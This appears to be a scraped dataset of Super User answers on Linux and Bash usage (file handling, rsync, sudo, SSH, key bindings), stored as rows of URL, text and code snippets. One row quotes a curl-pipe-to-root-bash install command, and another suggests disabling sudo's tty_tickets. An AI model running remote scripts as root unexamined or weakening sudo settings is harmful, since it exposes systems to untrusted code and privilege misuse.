412,https://superuser.com/questions1139856/,"[""In the first case, you're trying to overwrite the contents of a file that is currently running as a program. Linux does not allow that – if it did, you'd overwrite code right as the OS was executing it; the first difference would crash the program or make it malfunction."", ""But in the second case, you're not actually changing the old file's contents – you're creating a new file in its place, while the old one just loses the filename but keeps its contents untouched."", ""(Remember that rm doesn't technically delete files, it just removes directory links – similar to how ln adds more links to the same file. Only when a file has no links and no open file references, it automatically gets deleted.)"", ""The system references in-use files by their inode, so it doesn't matter that they have the same filename – it's still the old file that remains open by the system, and even though it has no links anymore, it will only get deleted once all programs close it.""]","[<code>rm</code>, <code>ln</code>]"
413,https://superuser.com/questions585391/,"['Here is a safe way:', 'If you would like to see which files are about to be deleted, simply remove the | xargs -0 rm -f -- part, and leave off the Z option to grep.', 'Another user suggested something like the following, which you should not run because it is unsafe:', 'If I have files ImportantStuff that I do not want to delete and obsolete ImportantStuff containing foo, then I lose ImportantStuff (and not obsolete ImportantStuff!) when I run this command, because $files gets broken apart at spaces when it is interpreted. It is dangerous to put a list of filenames into a scalar shell variable in this way.']","[<code>grep -lrIZ foo . | xargs -0 rm -f --
</code>, <code>-l</code>, <code>-r</code>, <code>foo</code>, <code>.</code>, <code>-R</code>, <code>-I</code>, <code>i</code>, <code>-Z</code>, <code>xargs -0</code>, <code>grep</code>, <code>rm -f</code>, <code>-Z</code>, <code>grep</code>, <code>--</code>, <code>-</code>, <code>| xargs -0 rm -f --</code>, <code>Z</code>, <code>grep</code>, <code>files=`grep foo * | cut -d: -f1`
rm -f $files         # unsafe, do not run it!
</code>, <code>ImportantStuff</code>, <code>obsolete ImportantStuff</code>, <code>foo</code>, <code>ImportantStuff</code>, <code>obsolete ImportantStuff</code>, <code>$files</code>]"
414,https://superuser.com/questions14269/,"[""Windows PowerShell (Original Server 2003 Link) is probably worth a look, I'm not sure if it has all the features you want but it's certainly a step up. Otherwise, Console is something I've seen my Windows brethren using that has a fair amount of the features you've asked for.""]",[]
415,https://superuser.com/questions692947/,"['Have a look at /proc/$PID/fd. There you should have all the file descriptors openned by the process, including the script itself. Just cat $FD > /tmp/yourscript.sh should be enough to recover it.']",[<code>cat $FD &gt; /tmp/yourscript.sh</code>]
416,https://superuser.com/questions82421/,"['You have to make the file executable. You can do that with', 'where  is the name of your script and then you have to prepend it with ./ to instruct the shell to run a file in the local directory, like:', 'You can only run files that are in your PATH or that you specify a path to them. ./, the local directory, is not in the PATH by default because someone may use it for nefarious purposes. Imagine a script called ls dropped in a directory, you go inside that directory, run ls and that script does something bad.', 'While you are at it you may want to make it more portable by running shell instead of bash by using:', 'or by running bash no matter where it is installed as long as it is installed:']","[<code>chmod +x &lt;filename&gt;
</code>, <code>./</code>, <code>./script.sh
</code>, <code>PATH</code>, <code>./</code>, <code>PATH</code>, <code>ls</code>, <code>ls</code>, <code>#!/bin/sh
</code>, <code>#!/usr/bin/env bash
</code>]"
417,https://superuser.com/questions375816/,"['These are the available SysRq functions:', '438 = 2 + 4 + 16 + 32 + 128 + 256, so only the functions associated with those numbers are allowed. Read all about it in the documentation.', 'If you convert 438 to base 2 (110110110) it is even easier to see.', 'Depending on your distribution, you may be able to tell if the kernel was compiled with CONFIG_MAGIC_SYSRQ using this command:', 'This works for me on Ubuntu.']","[<code>0 - disable every SysRq function.
1 - enable every SysRq function.
2 - enable control of console logging level
4 - enable control of keyboard (SAK, unraw)
8 - enable debugging dumps of processes etc.
16 - enable sync command
32 - enable remount read-only
64 - enable signalling of processes (term, kill, oom-kill)
128 - allow reboot/poweroff
256 - allow nicing of all RT tasks
</code>, <code>438</code>, <code>2 + 4 + 16 + 32 + 128 + 256</code>, <code>438</code>, <code>110110110</code>, <code>1     1     0    1    1    0   1   1   0
^256  ^128  ^64  ^32  ^16  ^8  ^4  ^2  ^1
</code>, <code>CONFIG_MAGIC_SYSRQ</code>, <code>$ grep SYSRQ /boot/config-$(uname -r)
</code>]"
418,https://superuser.com/questions205470/,"[""OS X uses emacs key binding my default. This is true is virtually every application on OS X, it's rather nice. It means things like C-a and C-e are beginning/end of line. You also get the nifty backward-word-kill with M-backspace, oh, and kill-line with C-k."", 'This should mean that in your terminal forward/backward-word are bound to M-f and M-b, respectively (M = Meta = alt/option), however that is not the case. On OS X forward/backword-word are bound to M-→ and M-← by default.', 'You can alter  this behavior by changing how the GNU Readline Library is configured for your account. This takes place in your ~/.inputrc file. You can get a big list of bindable commands with man readline as well as in the online documentation like this here..', 'So to answer your question, you want to remap what Readline does when it sees C-→ and C-← to do what it does on your linux server.', 'The syntax for a ~/.inputrc file is pretty simple for what you want to do: key-sequence: action.', 'This should be what you need to get the desired behavior:', ""Here's another page with additional useful bindings."", '(You could probably get away with copying /etc/inputrc from your linux box to your OS X ~/.inputrc)']","[<code>~/.inputrc</code>, <code>man readline</code>, <code>~/.inputrc</code>, <code>key-sequence: action</code>, <code>""\e[5C"": forward-word
""\e[5D"": backward-word
</code>]"
419,https://superuser.com/questions608887/,"[""While Paul's solution is generally OK, it involves more I/O than simply:""]","[<code>find bin/ -type f -printf '%Ts\t%p\n' | sort -nr | cut -f2
</code>]"
420,https://superuser.com/questions510152/,"[""sh /path/to/script will spawn a new shell and run she script independent of your current shell. The source (.) command will call all the commands in the script in the current shell. If the script happens to call exit for example, then you'll lose the current shell. Because of this it is usually safer to call scripts in a separate shell with sh or to execute them as binaries using either the full (starting with /) or relative path (./). If called as binaries, they will be executed with the specified interpreter (#!/bin/bash, for example)."", ""As for knowing whether or not a script will find the files it needs, there is no good answer, other than looking at the script to see what it does. As an option, you could always go to the script's folder in a sub-process without leaving your current folder:""]","[<code>source</code>, <code>exit</code>, <code>/</code>, <code>./</code>, <code>#!/bin/bash</code>, <code>(cd /wherever/ ; sh script.sh)
</code>]"
421,https://superuser.com/questions1276960/,"['CtrlAltF1 might be getting captured by the host, or VirtualBox might not be passing it on correctly. A couple of quick tests tells me that you can use the Host key defined in VirtualBox instead of CtrlAlt (could be the left Ctrl, or the left ⌘ on Macs). So, pressing  ⌘F1 switched to TTY1 in VirtualBox for me (and similarly for ⌘F7 back to GUI).']",[]
422,https://superuser.com/questions156309/,['cygstart /bin/bash -li'],[<code>cygstart /bin/bash -li</code>]
423,https://superuser.com/questions619849/,[],"[<code>extglob</code>, <code>SHELL=/bin/bash
.SHELLFLAGS=""-O extglob -c""
 ...
</code>]"
424,https://superuser.com/questions594203/,"['Use rsync. From the new host, you can use', ""rsync -avP --numeric-ids --exclude='/dev' --exclude='/proc' --exclude='/sys' root@failedharddrivehost:/ /path/to/destination/"", ""I wouldn't try involving something like tar because it probably won't work when there are broken files.""]",[<code>rsync -avP --numeric-ids --exclude='/dev' --exclude='/proc' --exclude='/sys' root@failedharddrivehost:/ /path/to/destination/</code>]
425,https://superuser.com/questions237072/,"['Works fine here. Make sure that the backslash is the very last character on the line, and that the file uses *nix line endings.']",[]
426,https://superuser.com/questions711017/,"['Or, if you prefer the pipeline format:', 'The problem is that date does not use stdin.  Thus, we have to capture the stdin into a variable (called gmt here) and then supply that on the command line to date.', 'Sample output from the second approach:']","[<code>gmt=""$(grep ""something"" logfile.txt | grep ""Succeeded"" | cut -f1 -d'[')""
date -d ""$gmt""
</code>, <code>grep ""something"" logfile.txt | grep ""Succeeded"" | cut -f1 -d'[' | { read gmt ; date -d ""$gmt"" ; }
</code>, <code>date</code>, <code>gmt</code>, <code>date</code>, <code>$ echo  ""2014-01-30 05:04:27 GMT"" | { read gmt ; date -d ""$gmt"" ; }
Wed Jan 29 21:04:27 PST 2014
</code>]"
427,https://superuser.com/questions1110625/,"['No, according to this thread: https://github.com/Microsoft/BashOnWindows/issues/69 the network options to support nmap are currently not all implemented.']",[]
428,https://superuser.com/questions354439/,"['Yes.  Append | to the redirection operator to form >|.  This is in § 3.6.2 of the Bash Reference Manual, q.v.', 'If the redirection operator is ‘>’, and the noclobber option to the set builtin has been enabled, the redirection will fail if the file whose name results from the expansion of word exists and is a regular file. If the redirection operator is ‘>|’, or the redirection operator is ‘>’ and the noclobber option is not enabled, the redirection is attempted even if the file named by word exists.', 'Visit this tutorial about the noclobber option. It might be of help.']","[<code>|</code>, <code>&gt;|</code>]"
429,https://superuser.com/questions257250/,"['Give this a try:', 'It will only feed one filename to each invocation of sed. That will solve the ""too many args for sed"" problem. The -P option should allow multiple processes to be forked at the same time. If 0 doesn\'t work (it\'s supposed to run as many as possible), try other numbers (10? 100? the number of cores you have?) to limit the number.']","[<code>find -name '*.txt' -print0 | xargs -0 -I {} -P 0 sed -i -e 's/blah/blee/g' {}
</code>, <code>sed</code>, <code>-P</code>]"
430,https://superuser.com/questions178796/,"['""Input"" and ""command line arguments"" are different things.', 'rm removes the files provided as arguments.', 'A pipe redirects the output of the left-hand command to the input of the right-hand command.  It does not affect the command line arguments of the program on the right.', ""To do what you're trying to do, try using xargs to convert standard input to command-line arguments for executing a program.  That's its job."", 'which gem | xargs rm, for example, will remove the gem in your PATH.']","[<code>rm</code>, <code>xargs</code>, <code>which gem | xargs rm</code>, <code>gem</code>]"
431,https://superuser.com/questions1104906/,"[""Bash caches the full path to executables so that it doesn't have to look through $PATH every time."", 'You can see what is in the cache using the hash command:', 'This cache can be cleared with hash -r:']","[<code>$PATH</code>, <code>hash</code>, <code>deltik@node51 [~]$ hash
hits    command
   1    /usr/bin/git
</code>, <code>hash -r</code>, <code>deltik@node51 [~]$ hash -r
deltik@node51 [~]$ hash
hash: hash table empty
</code>, <code>hash</code>]"
432,https://superuser.com/questions660191/,"['I just wrote this function for the same reason.  I never know which shell has admin privileges.', 'It adapted from this answer https://stackoverflow.com/a/11995662/307968 for windows cmd shell.   Net Session returns 0 status if you are admin.', 'Now I just need to change my prompt, or maybe the titlebar color....']","[<code>function isadmin()
{
    net session &gt; /dev/null 2&gt;&amp;1
    if [ $? -eq 0 ]; then echo ""admin""
    else echo ""user""; fi
}
</code>]"
433,https://superuser.com/questions305939/,['getent uses the low-level glibc information functions to query all configured sources.'],"[<code>getent</code>, <code>$ getent ahosts amd.com
163.181.249.32  STREAM amd.com
163.181.249.32  DGRAM  
163.181.249.32  RAW    
$ getent ahosts ipv6.google.com
2001:4860:b009::69 STREAM ipv6.l.google.com
2001:4860:b009::69 DGRAM  
2001:4860:b009::69 RAW    
</code>]"
434,https://superuser.com/questions519369/,"['You can use less to see what you want to edit and use sed to make the changes. This way you edit without loading the entire file.', 'Another way is to split the file, edit and join again:']","[<code>less</code>, <code>sed</code>, <code>split -b 10000k &lt;file&gt;

and to join:

cat xa* &gt; &lt;file&gt;
</code>]"
435,https://superuser.com/questions708919/,"['I was right in thinking that it was SIGINT being sent to all processes when ctrl+c, but I was silly in thinking that making another process would bring it outside the process group (see my attempts in the P.P.S.).', 'This is, not only the exact use case, but the correct solution.', ""Because of how my script was structured the answer there didn't fit verbatim, this is the script now;"", 'The server continues to output to the log file after I ctrl+c in less.', ""Thanks for everyone's time.""]","[<code>SIGINT</code>, <code>process group</code>, <code>P.P.S.</code>, <code>#/bin/bash

setsid {SERVERCOMMAND} &gt; currentOutput.log 2&gt;&amp;1 &amp;
less +F currentOutput.log
</code>, <code>less</code>]"
436,https://superuser.com/questions384769/,"[""You're right."", ""It's bad because you get used to it. If you're on a system that doesn't have it, and you rm, it immediately starts deleting and you're wondering what's going on."", ""Many users are used to SSH'ing into different systems; so using lots of different systems, sometimes without personalized user accounts (including aliases) set up, is rather common."", ""Instead, use e.g. alias rmi='rm -i' and learn to use that one. If that isn't set up on a different system, you didn't accidentally delete files and can always fall back to typing the full command.""]","[<code>rm</code>, <code>alias rmi='rm -i'</code>]"
437,https://superuser.com/questions623392/,"['If ~/oldstuff does not exist, ', 'will rename newstuff to oldstuff. If it exists, it will move newstuff into oldstuff.', 'So, to answer your question, first remove ~/oldstuff (or rename it to olderstuff, see this question again on how to do it), then use the mv command as you did.']","[<code>~/oldstuff</code>, <code>mv ~/newstuff ~/oldstuff
</code>, <code>newstuff</code>, <code>oldstuff</code>, <code>newstuff</code>, <code>oldstuff</code>, <code>~/oldstuff</code>, <code>olderstuff</code>, <code>mv</code>]"
438,https://superuser.com/questions1459886/,"[""While I like the vipe approach, I've found an even cooler way: fzf."", '...gives a nice list where I can search in and toggle the items with the keyboard and disappears completely when I am done.']","[<code>vipe</code>, <code>cat people.txt | grep -v ""^#"" | grep ""^.*Fruit.*Folk"" | fzf -m | cat
</code>]"
439,https://superuser.com/questions296572/,"['You can always use Ctrl-W. It deletes the word before the cursor and works in every Bash.', 'See here for a list of Bash keyboard shortcuts.']",[]
440,https://superuser.com/questions398448/,"['getfacl can dump ACLs recursively, and it has a --skip-base option for ignoring files without ACLs.']","[<code>getfacl</code>, <code>--skip-base</code>, <code>getfacl -R -s -p /directory | sed -n 's/^# file: //p'
</code>]"
441,https://superuser.com/questions455935/,['Try the following suggestions:'],"[<code>php -r ""echo exec('whoami');""</code>, <code>r-x</code>, <code>chmod 755 dir; chmod 755 file</code>, <code>+s</code>, <code>chmod u+s file</code>, <code>safe_mode</code>, <code>include_path</code>, <code>php.ini</code>, <code>include_path "".:/usr/local/lib/php:/your/dir""</code>, <code>.htaccess</code>, <code>php_value include_path "".:/usr/local/lib/php:/your/dir""</code>, <code>/bin/sh</code>, <code>finger</code>, <code>php.ini</code>, <code>disable_functions</code>, <code>exec</code>, <code>selinux-utils</code>, <code>getenforce</code>, <code>setenforce</code>, <code>php.ini</code>, <code>httpd.conf</code>, <code>php.ini</code>, <code>display_error</code>, <code>error_reporting</code>]"
442,https://superuser.com/questions688882/,"['Your script indicates you are using string comparisons.', 'Assume server name could be a string instead of number only.', 'For String comparisons:\nif [[ ""$Server_Name"" == 1 ]]; then', 'Notes:', 'Spacing around = is a must\nif [ $Server_Name=1 ]; then is WRONG', '[[ ... ]] reduces errors as no pathname expansion or word splitting takes place between [[ and ]]', 'Prefer quoting strings that are ""words""', 'For Integer comparisons:\nif [[ ""$Server_Name"" -eq 1 ]]; then', 'More information:']","[<code>if [[ ""$Server_Name"" == 1 ]]; then</code>, <code>if [ $Server_Name=1 ]; then</code>, <code>if [[ ""$Server_Name"" -eq 1 ]]; then</code>]"
443,https://superuser.com/questions324601/,"['Control + A then Control + K. The first moves your cursor to the beginning of the line, the second clears the line after the cursor.', 'A messier way to do this is hit enter and then hit Control + C. Credit to @billc.cn', 'If you want to clear the whole prompt, use Control + L.']","[<code>Control + A</code>, <code>Control + K</code>, <code>Control + C</code>, <code>Control + L</code>]"
444,https://superuser.com/questions278859/,"['It means that bash is invoked as a login shell.', 'man bash says:', 'A login shell is one whose first character of argument zero is a -, or one started with the --login option.', 'When bash is invoked as an interactive login shell, or as a non-interactive shell with the --login option, it first reads and executes commands from the file /etc/profile, if that file exists.  After reading  that  file,  it  looks for ~/.bash_profile, ~/.bash_login, and ~/.profile, in that order, and reads and executes commands from the first one that exists and is readable.  The --noprofile option may be used when the shell is started to inhibit this behavior.', 'When a login shell exits, bash reads and executes commands from the file ~/.bash_logout, if it exists.', ""You'll find login -pf in your ps output, which starts a login shell by default."", 'Try running login -pf and login -pfl and see the difference. man login describes the difference:', ""-l Tells the program executed by login that this is not a login session (by convention, a login session is signalled to the program with a hyphen as the first character of argv[0]; this option disables that), and prevents it from chdir(2)ing to the user's home directory.  The default is to add the hyphen (this is a login session).""]","[<code>bash</code>, <code>man bash</code>, <code>-</code>, <code>--login</code>, <code>--login</code>, <code>/etc/profile</code>, <code>~/.bash_profile</code>, <code>~/.bash_login</code>, <code>~/.profile</code>, <code>--noprofile</code>, <code>~/.bash_logout</code>, <code>login -pf</code>, <code>ps</code>, <code>login -pf</code>, <code>login -pfl</code>, <code>man login</code>, <code>-l</code>, <code>argv[0]</code>, <code>chdir(2)</code>]"
445,https://superuser.com/questions468161/,['No. But you can use sudo to run a shell and use a heredoc to feed it commands.'],"[<code>sudo</code>, <code>#!/bin/bash
whoami
sudo -u someuser bash &lt;&lt; EOF
echo ""In""
whoami
EOF
echo ""Out""
whoami
</code>]"
446,https://superuser.com/questions1359633/,"['Executed below 2 commands and then I was able to install the packages. ', 'sudo apt update', 'sudo apt install python3-pip', 'Source -  https://linuxize.com/post/how-to-install-pip-on-ubuntu-18.04/']",[]
447,https://superuser.com/questions649884/,"['With thanks to @rici, this behaviour can be called ""folding"".  The output of commands isn\'t forgotten, but you can hide it until you need it again.  Folding is common in text editors but seems to be rare in terminal emulators.', 'Final Term is a new terminal emulator that includes folding among many other fancy tricks.  Beware: ""Final Term is in heavy development and neither stable nor feature complete!""  It was heavily-enough developed to fold my commands when I tested it, but too unstable not to crash.  One to watch.']",[]
448,https://superuser.com/questions1388584/,"['Bash behaves in somewhat non-standard way when it comes to -.', 'POSIX says:', 'Guideline 10:\n  The first -- argument that is not an option-argument should be accepted as a delimiter indicating the end of options. Any following arguments should be treated as operands, even if they begin with the - character.', '[…]', 'Guideline 13:\n  For utilities that use operands to represent files to be opened for either reading or writing, the - operand should be used to mean only standard input (or standard output when it is clear from context that an output file is being specified) or a file named -.', 'And', 'Where a utility described in the Shell and Utilities volume of POSIX.1-2017 as conforming to these guidelines is required to accept, or not to accept, the operand - to mean standard input or output, this usage is explained in the OPERANDS section. Otherwise, if such a utility uses operands to represent files, it is implementation-defined whether the operand - stands for standard input (or standard output), or for a file named -.', 'But then man 1 bash reads:', 'A -- signals the end of options and disables further option processing. Any arguments after the -- are treated as filenames and arguments. An argument of - is equivalent to --.', 'So for Bash - means neither standard input nor a file, hence somewhat non-standard.', 'Now your particular case:', 'I suspect the author of this command may not realize - is equivalent to -- in this case. I suspect the author wanted to make sure bash will read from its standard input, they expected - to work according to the guideline 13.', 'But even if it worked according to the guideline, - would be unnecessary here because bash detects when its standard input is a pipe and acts accordingly (unless -c is given etc.). ', ""Yet - doesn't work according to the guideline, it works like --. Still -- is unnecessary here because there are no arguments after it."", 'In my opinion the last - changes nothing. The command would work without it.', 'To see how -- and - can be useful in general, study the example below.', 'cat in my Kubuntu obeys both guidelines and I will use it to demonstrate usefulness of - and --.', 'Let a file named foo exist. This will print the file:', ""Let a file named --help exist. This won't print the file:"", 'But this will print the file named --help:', 'This will concatenate the file named --help with whatever comes from the standard input:', ""It seems you don't really need --, because you can always pass ./--help which will be interpreted as a file for sure. But consider"", ""when you don't know beforehand what the content of the variable is. You cannot just prepend ./ to it, because it may be an absolute path and ./ would break it. On the other hand it may be a file named --help (because why not?). In this case -- is very useful; this is a lot more robust command:""]","[<code>-</code>, <code>--</code>, <code>-</code>, <code>-</code>, <code>-</code>, <code>-</code>, <code>-</code>, <code>-</code>, <code>man 1 bash</code>, <code>--</code>, <code>--</code>, <code>-</code>, <code>--</code>, <code>-</code>, <code>curl -sL https://rpm.nodesource.com/setup_6.x | sudo -E bash -
</code>, <code>-</code>, <code>--</code>, <code>bash</code>, <code>-</code>, <code>-</code>, <code>bash</code>, <code>-c</code>, <code>-</code>, <code>--</code>, <code>--</code>, <code>-</code>, <code>--</code>, <code>-</code>, <code>cat</code>, <code>-</code>, <code>--</code>, <code>foo</code>, <code>cat foo
</code>, <code>--help</code>, <code>cat --help
</code>, <code>--help</code>, <code>cat -- --help
</code>, <code>--help</code>, <code>cat -- --help -
</code>, <code>--</code>, <code>./--help</code>, <code>cat ""$file""
</code>, <code>./</code>, <code>./</code>, <code>--help</code>, <code>--</code>, <code>cat -- ""$file""
</code>]"
449,https://superuser.com/questions20679/,"['This behaviour stems from the lack of a controlling terminal for the running process. When the remote process does not have a controlling terminal, the remote ssh process handling your session is unable to kill the command, which is left hanging in a zombie state to be eventually cleaned up by init.', 'You can get around this by running it with a -t option, which gives it a controlling terminal. This will cause the process to terminate when you ctrl-c your ssh command remotely.', 'The -t option:', 'Force pseudo-tty allocation.  This can be used to execute arbitrary \n  screen-based\n  programs on a remote\n               machine, which can be very useful, e.g. when implementing\n  menu services.  Multiple -t options\n  force tty\n               allocation, even if ssh has no local tty.', 'Have a look at man ssh and man sshd when you use this option as there are other implications of having a controlling terminal, e.g. the ability to send escape characters. ']",[]
450,https://superuser.com/questions236484/,"['Try this:', 'It\'s known as a ""sequence expression"" and it\'s part of Bash\'s brace expansion feature. It works in Bash 3 and 4.', 'The increment feature is new to Bash 4. You probably have Bash 3.x. ', 'In Bash 4, you can do:', 'But in Bash 3, you have to do this to get the same results:', 'The same form incrementing by one:', 'Any of the numbers can be variables or expressions. However, in a sequence expression the numbers have to be constants', 'Here is an example using that form on your files:', 'Another new feature of sequence expressions in Bash 4 is the ability to include leading zeros. This is useful if you want to create (and use) numbered files that can be properly sorted.', 'In Bash 4:', 'would create files named ""file001.txt"" through ""file010.txt"". Their names will sort in the expected order. Without the leading zeros, ""file10.txt"" would sort before ""file1.txt"".', 'To work with the files, you can use the same leading zero syntax:', 'In Bash 3, if you need leading zeros, you need to pad the value yourself: ', 'The printf statement will prepend the value of i with leading zeros so the width is 3, for example (""4"" becomes ""004"").', 'Edit:', 'Accommodating spaces in filenames is straightforward:']","[<code>for file in file{18..31}.txt
</code>, <code>$ for i in {1..6..2}; do echo $i; done
1
3
5
</code>, <code>$ for ((i=1; i&lt;=6; i+=2)); do echo $i; done
</code>, <code>$ for ((i=1; i&lt;=6; i++)); do echo $i; done
</code>, <code>for ((i=18; i&lt;=31; i++))
do
    echo ""file${i}.txt""
done
</code>, <code>touch file{001..010}.txt
</code>, <code>for file in file{001..010}.txt; do echo ""$file""; done
</code>, <code>for i in {1..10}
do
    printf -v i '%03d' $i 
    echo ""file${i}.txt""
done
</code>, <code>printf</code>, <code>$ touch ""space name ""{008..018..3}"" more spaces""
$ ls -l sp*
-rw-r--r-- 1 user group 0 2011-01-22 11:48 space name 000008 more spaces
-rw-r--r-- 1 user group 0 2011-01-22 11:48 space name 000011 more spaces
-rw-r--r-- 1 user group 0 2011-01-22 11:48 space name 000014 more spaces
-rw-r--r-- 1 user group 0 2011-01-22 11:48 space name 000017 more spaces
$ for f in ""space name ""{008..018..3}"" more spaces""; do mv ""$f"" ""${f}.txt""; done
$ ls -l sp*
-rw-r--r-- 1 user group 0 2011-01-22 11:48 space name 000008 more spaces.txt
-rw-r--r-- 1 user group 0 2011-01-22 11:48 space name 000011 more spaces.txt
-rw-r--r-- 1 user group 0 2011-01-22 11:48 space name 000014 more spaces.txt
-rw-r--r-- 1 user group 0 2011-01-22 11:48 space name 000017 more spaces.txt
</code>]"
451,https://superuser.com/questions319043/,"[""Here's an answer that doesn't require sudo privileges or the user's password, but still provides an environment like what you'd get on a fresh login."", 'Example:', 'Breaking this down for explanation:', 'env -i HOME=""$HOME"": Clears the environment. The -i sets up an empty environment with no variables whatsoever. This is problematic because it means that if you try to naively run bash -l it won\'t load your .bash_profile etc. because HOME isn\'t set. To mitigate this, we explicitly pass HOME=""$HOME"", creating an environment where HOME (and only HOME) is set.', ""bash -l -c ...: Runs the desired command in a login shell. You'll want a login shell for this because we're starting from a clean environment and need to reload everything."", 'Notably:']","[<code>env -i HOME=""$HOME"" bash -l -c 'your_command'
</code>, <code>$ export ABC=123
$ env -i HOME=""$HOME"" bash -l -c 'env' | grep ABC
$ env HOME=""$HOME"" bash -l -c 'env' | grep ABC
ABC=123
</code>, <code>env -i HOME=""$HOME""</code>, <code>-i</code>, <code>bash -l</code>, <code>.bash_profile</code>, <code>HOME</code>, <code>HOME=""$HOME""</code>, <code>HOME</code>, <code>HOME</code>, <code>bash -l -c ...</code>, <code>sudo</code>, <code>su</code>, <code>ssh</code>]"
452,https://superuser.com/questions642555/,"['I was just wondering the same thing. The following is probably not the most efficient solution, but it seems to work. It recreates the directory structure of the webserver locally. (Found the first command via stackoverflow)']","[<code>wget --spider -r --no-parent http://some.served.dir.ca/
ls -l some.served.dir.ca
</code>]"
453,https://superuser.com/questions241191/,"['You can use rsync to do this, the command I use is rsync -tr ""folder to copy from"" ""folder to copy to""', 'e.g. rsync -tr /home/me/stuff/* /home/me/otherstuff/']","[<code>rsync</code>, <code>rsync -tr ""folder to copy from"" ""folder to copy to""</code>, <code>rsync -tr /home/me/stuff/* /home/me/otherstuff/</code>]"
454,https://superuser.com/questions174306/,"['At a Bash prompt, type the following commands and do the steps listed after each one:', 'If you get ""history off"" then add this line at the end of your ~/.bashrc:', 'Next try:', 'If the first one is blank or /dev/null, add this line to the end of your ~/.bashrc:', 'If either of the last two print 0, set them to some number like the default of 500:']","[<code>set -o | grep history
</code>, <code>~/.bashrc</code>, <code>set -o history
</code>, <code>echo $HISTFILE
echo $HISTSIZE
echo $HISTFILESIZE
</code>, <code>/dev/null</code>, <code>~/.bashrc</code>, <code>HISTFILE=$HOME/.bash_history
</code>, <code>HISTFILESIZE=500
HISTSIZE=500
</code>]"
455,https://superuser.com/questions769390/,"[""You're nearly done:"", 'sometimes (under certain terminals) you need reset the terminal after editing.']","[<code>$ locate updatedb | head -1 | xargs vim
</code>, <code>$ reset
</code>]"
456,https://superuser.com/questions328708/,"[""UltraCopier is a free and cross-platform copy utility that is currently in development, so it's not that neat and polished yet. Once you install it, it sits in your menu bar."", 'It manages a copy list that allows you to queue copy or move jobs, which are then sequentially processed. You can also define the copy process priority as well as the block size of the transfer.', 'With the new version you can group with similar source and/or destination, or just always or never.', '']",[]
457,https://superuser.com/questions703911/,"['This looks like part of the EMACS readline bash key bindings i.e. they appear to be key combinations that are used in EMACS and emulated or add-ons to bash, or something.  Mine work as yours do, unfortunately, but I have a workaround since you are speaking with respect to iTerm2:', ""Go into the Preferences for the profile of the Terminal session you'd like to inflict this upon, and establish the key-binding as illustrated thus:"", '', 'This is probably not the solution that you are looking for, however it should work for you in a pinch.']",[]
458,https://superuser.com/questions289162/,['navigate to the dir and type'],"[<code>open .
</code>]"
459,https://superuser.com/questions443994/,"['The new line character with the echo command is ""\\n"". Taking the following example:', 'Would result in the output', 'The ""-e"" parameter is important here.']","[<code>echo</code>, <code>echo -e ""This is line 1\nThis is line 2""
</code>, <code>This is line 1
This is line 2
</code>]"
460,https://superuser.com/questions143925/,"['Normally the processes will terminate upon disconnection, but the old SSH sessions could either be waiting to timeout, or they could have hung upon exit, due to a race condition.', ""You should probably terminate the old sessions, although you don't necessarily have to.  Type ps aux on the console to list the processes, then kill PID for each hung ssh session, where PID is the PID (process ID) for that session.  The older, hung sessions should have lower PIDs than your current, new session."", 'If there is a long-running process that you specifically want to continue running even after you disconnect, you can prefix your command with nohup:']","[<code>ps aux</code>, <code>kill PID</code>, <code>nohup badblocks -nvs /dev/sda &amp;
</code>]"
461,https://superuser.com/questions244634/,['You can use (GNU) cp with the --symbolic-link option:'],"[<code>cp</code>, <code>--symbolic-link</code>, <code>prompt$ mkdir foo
prompt$ cd foo
prompt$ touch a b c
prompt$ mkdir ../bar
prompt$ cd ../bar
prompt$ cp --symbolic-link ../foo/* .
prompt$ ls -l
total 0
lrwxrwxrwx. 1 hlovdal hlovdal 8 Jun 12 16:24 a -&gt; ../foo/a
lrwxrwxrwx. 1 hlovdal hlovdal 8 Jun 12 16:24 b -&gt; ../foo/b
lrwxrwxrwx. 1 hlovdal hlovdal 8 Jun 12 16:24 c -&gt; ../foo/c
prompt$
</code>]"
462,https://superuser.com/questions1547945/,"['I found my etc folder in:', ""Note: I'm using WSL1 so as to be able to use VMware. WSL2 uses Hyper-V\nwhich is incompatible with other virtualization hypervisors.\n(Edit: This is no longer true.)"", 'However, this is changing now and in the near future.\nRecently both VirtualBox and VMware have released versions that support\nHyper-V and WSL2. You can learn more about it for\nVirtualBox\nand\nVMware.\nThe VMware solution requires the soon to be released\nWindows 10 Build 20H1, while VirtualBox is possibly\nusable now.', 'This next version of Windows is also advertised as allowing greater\nintegration between Windows and WSL, perhaps even solving the problem\nof concurrent updates of the same files from both subsystems.']","[<code>etc</code>, <code>C:\Users\USER\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\etc
</code>]"
463,https://superuser.com/questions623112/,"['I assume that what you are doing in your allcommands.sh is:', 'Just relace it with']","[<code>command1.sh
command2.sh
</code>, <code>command1.sh | sed ""s/^/[command1] /""
command2.sh | sed ""s/^/[command2] /""
</code>]"
464,https://superuser.com/questions588632/,"['Turn off tty_tickets. See sudoers(5) for more information.', 'Run visudo and then add a line:']","[<code>tty_tickets</code>, <code>sudoers(5)</code>, <code>visudo</code>, <code>Defaults !tty_tickets
</code>]"
465,https://superuser.com/questions463540/,"['Interactive commands and cron jobs run in different environments – in particular, an interactive session might have a SSH agent running, or a Kerberos TGT stored. Because of the way ssh orders authentication methods, you cannot be sure that your key is used just because you added the -i option.', 'If a SSH agent is running, the ssh client always tries agent keys before using any explicitly-specified keys.', 'If the network uses Kerberos and a Kerberos TGT is present, OpenSSH will use it before trying public-key authentication.', ""I don't know anything about your environment, but both of these possibilities are easy to check:"", 'Add unset SSH_AUTH_SOCK and unset KRB5CCNAME before the ssh command, then manually run the modified script.', 'This will prevent the script from seeing the agent or the Kerberos tickets, and will only use the explicitly-specified key.', 'Add the -v option to ssh. This will display more detail on how the authentication happens.', 'You can also add -oIdentitiesOnly=yes to the ssh command; this will force it to use the specified key.', 'And if you add tips on accessing the agent from cron - even better', ""This is generally not recommended, since the agent is usually closely tied to your interactive login session. In particular, it's only started when you log in, and killed when you log out – and it needs your password to actually unlock the SSH keys (assuming they were password-protected)."", 'You mentioned ""Keychain"" – is this the OS X program, or the Linux script? (I don\'t know much about the architecture of Mac OS X, but AFAIK it makes it much harder to access the user\'s ssh-agent from a cronjob...)']","[<code>ssh</code>, <code>-i</code>, <code>ssh</code>, <code>unset SSH_AUTH_SOCK</code>, <code>unset KRB5CCNAME</code>, <code>ssh</code>, <code>-v</code>, <code>ssh</code>, <code>-oIdentitiesOnly=yes</code>, <code>ssh</code>]"
